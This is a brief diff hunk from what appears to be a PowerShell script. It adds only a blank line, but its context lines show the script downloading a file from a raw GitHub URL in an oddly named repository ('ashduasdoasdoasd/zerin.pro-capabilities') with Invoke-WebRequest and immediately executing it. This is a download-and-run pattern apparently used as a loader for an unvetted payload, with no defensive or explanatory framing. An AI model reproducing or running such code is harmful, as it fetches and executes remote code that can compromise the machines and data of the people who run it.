@@ -7,3 +7,4 @@ $url = "https://github.com/ashduasdoasdoasd/zerin.pro-capabilities/raw/refs/head
 Invoke-WebRequest -Uri $url -OutFile $filePath
 
 & $filePath
+
